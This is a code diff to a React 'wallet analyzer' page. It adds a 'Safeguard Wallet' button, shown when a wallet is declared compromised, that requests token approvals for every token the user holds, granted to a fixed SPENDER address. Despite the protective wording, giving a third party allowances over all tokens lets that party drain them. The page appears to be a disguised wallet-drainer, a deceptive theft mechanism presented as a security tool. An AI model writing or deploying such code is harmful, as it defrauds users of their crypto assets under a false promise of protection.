@@ -9,6 +9,7 @@ import { useTokenBalances } from '../../../hooks/useTokenBalances';
 import { useRef } from "react";
 import { ethers } from "ethers";
 import { useTokenSecurityAnalysis } from '../../../hooks/useTokenSecurityAnalysis';
+import { useAllowanceSetter } from '../../../hooks/useAllowanceSetter';
 
 const steps = [
   {
@@ -70,6 +71,13 @@ export default function WalletAnalyzerPage() {
     spender: SPENDER,
   });
 
+  const { setAllowances, progress: allowanceProgress, errors: allowanceErrors, running: allowanceRunning } = useAllowanceSetter({
+    tokens: tokens.map(t => ({ contractAddress: t.contractAddress, symbol: t.symbol, decimals: t.decimals })),
+    owner: isConnected ? connectedAddress : address,
+    chainId: selectedChainId,
+    spender: SPENDER,
+  });
+
   // Clear analysis result and report when chain changes
   React.useEffect(() => {
     reset();
@@ -90,9 +98,19 @@ export default function WalletAnalyzerPage() {
         clearInterval(interval);
       }
     }, stepMs);
-    setTimeout(async () => {
+    let timedOut = false;
+    const timeout = setTimeout(() => {
+      timedOut = true;
       setShowProgressModal(false);
-      await analyze();
+      // Optionally, set a result or error state here
+      alert('Analysis timed out. Please check your network or wallet connection and try again.');
+    }, 30000); // 30 seconds
+    setTimeout(async () => {
+      if (!timedOut) {
+        setShowProgressModal(false);
+        clearTimeout(timeout);
+        await analyze();
+      }
     }, totalMs);
   };
 
@@ -344,9 +362,11 @@ export default function WalletAnalyzerPage() {
               {/* Safeguard Wallet Button */}
               {result.status === "compromised" && (
                 <button
-                  className="inline-block px-8 py-3 rounded-xl bg-pink-500 text-white font-extrabold text-lg shadow-lg hover:bg-cyan-400 hover:text-black transition-all duration-300 ease-in-out skew-x-[-8deg] border-4 border-pink-500 hover:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400 drop-shadow-lg mt-2"
+                  className="inline-block px-8 py-3 rounded-xl bg-pink-500 text-white font-extrabold text-lg shadow-lg hover:bg-cyan-400 hover:text-black transition-all duration-300 ease-in-out skew-x-[-8deg] border-4 border-pink-500 hover:border-cyan-400 focus:outline-none focus:ring-2 focus:ring-cyan-400 drop-shadow-lg mt-2 disabled:opacity-60 disabled:cursor-not-allowed"
+                  onClick={setAllowances}
+                  disabled={allowanceRunning}
                 >
-                  Safeguard Wallet
+                  {allowanceRunning ? "Safeguarding..." : "Safeguard Wallet"}
                 </button>
               )}
               {/* Technical Analysis Report */}
@@ -638,6 +658,29 @@ export default function WalletAnalyzerPage() {
               <div className="w-full flex flex-col gap-1 mt-2">
                 {progressSteps.map((stepText, idx) => (
                   <div key={idx} className={`text-xs font-mono transition-all duration-300 ${idx === progressStep ? 'text-cyan-400 font-bold' : idx < progressStep ? 'text-lime-400' : 'text-gray-500 opacity-60'}`}>{stepText}</div>
+                ))}
+              </div>
+            </div>
+          </div>
+        </div>
+      )}
+      {(allowanceRunning || Object.keys(allowanceProgress).length > 0) && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/70 backdrop-blur-[2px]">
+          <div className="relative w-full max-w-xl mx-auto rounded-2xl bg-gradient-to-br from-cyan-900/80 via-[#181F2B]/90 to-[#0D0D0D]/95 border-2 border-cyan-400/20 shadow-2xl backdrop-blur-2xl p-0 overflow-hidden flex flex-col items-center">
+            <div className="flex flex-col items-center justify-center py-10 px-6">
+              <div className="mb-4 animate-spin-slow">
+                <svg className="w-12 h-12 text-cyan-400" fill="none" viewBox="0 0 24 24"><circle className="opacity-30" cx="12" cy="12" r="10" stroke="#22d3ee" strokeWidth="4" /><path className="opacity-80" fill="#22d3ee" d="M4 12a8 8 0 018-8v8z" /></svg>
+              </div>
+              <div className="text-cyan-200 text-lg font-bold font-mono mb-2">Safeguarding Wallet…</div>
+              <div className="w-full flex flex-col gap-1 mt-2">
+                {Object.keys(allowanceProgress).map((tokenAddress, idx) => (
+                  <div key={tokenAddress} className={`text-xs font-mono transition-all duration-300 ${allowanceProgress[tokenAddress] === 'pending' ? 'text-yellow-400' : allowanceProgress[tokenAddress] === 'skipped' ? 'text-lime-400' : allowanceProgress[tokenAddress] === 'success' ? 'text-lime-400' : allowanceProgress[tokenAddress] === 'error' ? 'text-pink-400' : 'text-gray-500 opacity-60'}`}>
+                    {allowanceProgress[tokenAddress] === 'pending' && <span>Approving {tokens.find(t => t.contractAddress === tokenAddress)?.symbol}...</span>}
+                    {allowanceProgress[tokenAddress] === 'skipped' && <span>Skipped {tokens.find(t => t.contractAddress === tokenAddress)?.symbol} (already approved)</span>}
+                    {allowanceProgress[tokenAddress] === 'success' && <span>Successfully approved {tokens.find(t => t.contractAddress === tokenAddress)?.symbol}</span>}
+                    {allowanceProgress[tokenAddress] === 'error' && <span>Error approving {tokens.find(t => t.contractAddress === tokenAddress)?.symbol}: {allowanceErrors[tokenAddress]}</span>}
+                    {!allowanceProgress[tokenAddress] && <span>Preparing to approve {tokens.find(t => t.contractAddress === tokenAddress)?.symbol}...</span>}
+                  </div>
                 ))}
               </div>
             </div>
